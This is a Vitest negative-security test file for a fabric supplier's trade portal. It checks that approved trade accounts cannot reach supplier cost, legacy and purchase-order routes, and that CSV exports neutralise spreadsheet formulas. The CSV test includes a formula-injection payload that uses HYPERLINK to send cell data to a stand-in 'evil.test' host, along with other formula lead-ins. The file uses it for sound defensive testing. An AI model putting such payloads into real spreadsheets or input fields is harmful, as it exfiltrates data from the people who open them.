// Negative security tests: an approved trade account is an EXTERNAL party, and
// nothing it can reach may carry Atelier's buy side.
//
// The threat is concrete. `price_list_items` is the supplier book — 19.5k line
// rates across 40 maisons, in the suppliers' own currencies, and for most
// suppliers already discount-inclusive, so it IS Atelier's net cost. Divide one
// into the matching trade price and the margin falls out; and the lists are the
// maisons' confidential documents, so disclosing them is also a supply-agreement
// problem. `legacy_product_prices` is worse again — it stages `wholesale_rate`,
// `landed_cost_nz` and both computed sell prices side by side.
//
// Two halves:
//   1. Every route that serves cost data still refuses an approved trade
//      session. These are the guards a future "just let the portal read it"
//      change would widen.
//   2. Nothing the portal DOES serve carries a cost-side key, asserted over the
//      real response bodies rather than by reading the SELECT lists.

import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import runner from 'node-pg-migrate'
import { loadConfig } from '../src/config.js'
import { createPool } from '../src/db.js'
import { buildApp } from '../src/app.js'
import { LEGACY_ENTITIES } from '../src/legacy/legacy-read.js'
import { CSV_HEADER, toTradePriceListCsv } from '../src/pricing/trade-price-lists.js'
import { sampleTradeApplication } from './helpers/trade-application-fixture.js'

const TEST_COOKIE_SECRET = 'test-cookie-secret-0123456789abcdef0123456789abcdef'
const PREFIX = 'exposure-test'
const PASSWORD = 'super-secret-pw'

// Any key naming Atelier's cost base, a supplier's identity as a price source,
// or a duty/freight class. Matched against every key in a client-facing body.
const FORBIDDEN_KEY = /wholesale|landed|duty|freight|cost|margin|markup|credit_limit|payment_terms/i

const collectKeys = (value, keys = []) => {
  if (Array.isArray(value)) {
    for (const entry of value) collectKeys(entry, keys)
  } else if (value && typeof value === 'object') {
    for (const [key, entry] of Object.entries(value)) {
      keys.push(key)
      collectKeys(entry, keys)
    }
  }
  return keys
}

const cookieOf = (res) => {
  const setCookie = res.headers['set-cookie']
  return (Array.isArray(setCookie) ? setCookie[0] : setCookie).split(';')[0]
}

describe('cost-side exposure', () => {
  let pool
  let app
  let tradeCookie

  beforeAll(async () => {
    const config = loadConfig()
    pool = createPool(config.databaseUrl)
    await runner({
      databaseUrl: config.databaseUrl,
      dir: 'migrations',
      direction: 'up',
      migrationsTable: 'pgmigrations',
      log: () => {},
    })
    await pool.query(`DELETE FROM trade_applications WHERE business_name LIKE $1`, [`${PREFIX}%`])
    await pool.query(`DELETE FROM users WHERE email LIKE $1`, [`${PREFIX}-%`])

    // Price lists ON, so the strongest version of the portal is under test.
    app = buildApp({
      pool,
      cookieSecret: TEST_COOKIE_SECRET,
      logger: false,
      tradePriceListsEnabled: true,
    })

    const email = `${PREFIX}-trade@example.test`
    const res = await app.inject({
      method: 'POST',
      url: '/auth/trade-application',
      payload: {
        email,
        password: PASSWORD,
        name: 'Trade User',
        application: sampleTradeApplication({ business_name: `${PREFIX} Studio` }),
      },
    })
    expect(res.statusCode).toBe(201)
    await pool.query(`UPDATE users SET trade_approved = true WHERE email = $1`, [email])
    const login = await app.inject({
      method: 'POST',
      url: '/auth/login',
      payload: { email, password: PASSWORD },
    })
    expect(login.statusCode).toBe(200)
    tradeCookie = cookieOf(login)
  })

  afterAll(async () => {
    await pool.query(`DELETE FROM trade_applications WHERE business_name LIKE $1`, [`${PREFIX}%`])
    await pool.query(`DELETE FROM users WHERE email LIKE $1`, [`${PREFIX}-%`])
    await app?.close()
    await pool?.end()
  })

  const asTrade = (url) => app.inject({ method: 'GET', url, headers: { cookie: tradeCookie } })

  // Any well-formed guid: the guard runs before the record is looked up, so the
  // assertion is about the refusal and never about what exists.
  const SAMPLE_GUID = '00000000-0000-4000-8000-000000000000'

  describe('guards that must never be widened', () => {
    it('refuses an approved trade account the supplier price-list API', async () => {
      expect((await asTrade('/admin/price-list-items')).statusCode).toBe(403)
    })

    // Parameterised over the whole vocabulary, not just `prices`: `accounts`
    // carries 866 other clients' discount, credit limit, payment terms and
    // contact email, and `stock`/`sales-orders` carry trade prices and other
    // clients' order totals.
    for (const entity of LEGACY_ENTITIES) {
      it(`refuses an approved trade account /admin/legacy/${entity}`, async () => {
        expect((await asTrade(`/admin/legacy/${entity}`)).statusCode).toBe(403)
      })

      it(`refuses an approved trade account a single ${entity} record`, async () => {
        // The detail route returns the whole `raw` jsonb alongside the column
        // whitelist, so it bypasses every projection there is.
        const res = await asTrade(
          `/admin/legacy/${entity}/00000000-0000-4000-8000-000000000000`
        )
        expect(res.statusCode).toBe(403)
      })

      // The override routes (migration 1787025600000) write client records —
      // a name, an email, a credit limit, a payment term — and suppress them
      // from the back office's view. A sweep that enumerated only GET would
      // leave every one of them outside the negative-security net this file
      // exists to be.
      //
      // Every payload here is schema-VALID on purpose: Fastify validates BEFORE
      // it runs a preHandler, so a malformed body asserts a 400 and would pass
      // with the guard deleted.
      const writes = [
        ['POST', `/admin/legacy/${entity}`, { values: { name: 'x' } }],
        ['PATCH', `/admin/legacy/${entity}/${SAMPLE_GUID}`, { set: { name: 'x' } }],
        ['DELETE', `/admin/legacy/${entity}/${SAMPLE_GUID}`, undefined],
        ['POST', `/admin/legacy/${entity}/${SAMPLE_GUID}/restore`, undefined],
      ]
      for (const [method, url, payload] of writes) {
        it(`refuses an approved trade account ${method} ${url}`, async () => {
          const res = await app.inject({
            method,
            url,
            headers: { cookie: tradeCookie },
            ...(payload === undefined ? {} : { payload }),
          })
          expect(res.statusCode).toBe(403)
        })
      }
    }

    it('refuses an approved trade account the legacy import', async () => {
      const res = await app.inject({
        method: 'POST',
        url: '/admin/legacy/import/accounts',
        headers: { cookie: tradeCookie },
        payload: [],
      })
      expect(res.statusCode).toBe(403)
    })

    // W13. `purchase_order_lines.unit_price` is what Atelier PAYS a maison, in
    // that maison's currency and for most of them already discount-inclusive —
    // the same disclosure `price_list_items.wholesale_rate` is, arrived at by a
    // different route. Divide one into the matching trade price and the margin
    // falls out. Extended here rather than as a second exposure test, so there
    // is one file that answers "what can an external party reach".
    //
    // Every payload is schema-VALID: Fastify validates BEFORE it runs a
    // preHandler, so a malformed body asserts a 400 and would pass with the
    // guard deleted.
    const purchasingWrites = [
      ['GET', '/admin/purchase-orders', undefined],
      ['GET', '/admin/purchase-orders/1', undefined],
      [
        'POST',
        '/admin/purchase-orders',
        { brand_id: 1, lines: [{ colourway_id: 1, qty_ordered: 1 }] },
      ],
      ['POST', '/admin/purchase-orders/plan', {}],
      ['POST', '/admin/purchase-orders/generate', {}],
      ['PATCH', '/admin/purchase-orders/1', { notes: 'x' }],
      ['POST', '/admin/purchase-orders/1/send', undefined],
      ['POST', '/admin/purchase-orders/1/close', undefined],
      ['POST', '/admin/purchase-orders/1/cancel', undefined],
      ['DELETE', '/admin/purchase-orders/1', undefined],
      ['POST', '/admin/purchase-order-lines/1/allocations', { order_line_id: 1, qty: 1 }],
      ['POST', '/admin/purchase-order-lines/1/receipts', { qty: 1 }],
    ]

    for (const [method, url, payload] of purchasingWrites) {
      it(`refuses an approved trade account ${method} ${url}`, async () => {
        const res = await app.inject({
          method,
          url,
          headers: { cookie: tradeCookie },
          ...(payload === undefined ? {} : { payload }),
        })
        expect(res.statusCode).toBe(403)
      })
    }
  })

  describe('what the portal actually serves', () => {
    it('carries no cost-side key on any client-facing body', async () => {
      for (const url of [
        '/account/summary',
        '/account/samples',
        '/account/invoices',
        '/account/price-lists',
      ]) {
        const res = await asTrade(url)
        expect(res.statusCode).toBe(200)
        const offenders = collectKeys(res.json()).filter((key) => FORBIDDEN_KEY.test(key))
        expect(offenders, `${url} exposes ${offenders.join(', ')}`).toEqual([])
      }
    })

    it('publishes exactly the agreed price-list columns and nothing else', async () => {
      // Asserted verbatim: a column added here is a disclosure decision, and it
      // should have to break this test to happen.
      expect(CSV_HEADER).toEqual([
        'Design',
        'Collection',
        'Colourway',
        'SKU',
        'Composition',
        'Width',
        'Application',
        'Lead time',
        'Trade price (NZD)',
      ])
    })
  })

  describe('CSV export safety', () => {
    // Every text column below is staff-typed free text via PATCH
    // /admin/products, and this file is built to be opened in Excel.
    const csv = toTradePriceListCsv({
      items: [
        {
          design: '=HYPERLINK("http://evil.test?x="&A1,"click")',
          collection: '+1+1',
          colourway: '-2-2',
          sku: '@SUM(A1:A9)',
          composition: 'Linen, "washed"',
          width: 'wide\nseam',
          application: 'Drapery',
          lead_time: '6 weeks',
          trade_price_cents: 18776,
        },
      ],
    })
    const dataRow = csv.split('\r\n')[1]

    it('neutralises every formula lead-in', () => {
      for (const prefix of ['=', '+', '-', '@']) {
        expect(dataRow).not.toMatch(new RegExp(`(^|,)"?\\${prefix}`))
      }
      expect(dataRow).toContain("'=HYPERLINK")
      expect(dataRow).toContain("'+1+1")
      expect(dataRow).toContain("'-2-2")
      expect(dataRow).toContain("'@SUM")
    })

    it('quotes and escapes values carrying a comma, quote or newline', () => {
      expect(dataRow).toContain('"Linen, ""washed"""')
      expect(dataRow).toContain('"wide\nseam"')
    })

    it('renders the price as dollars, not cents', () => {
      expect(dataRow.endsWith('187.76')).toBe(true)
    })
  })
})
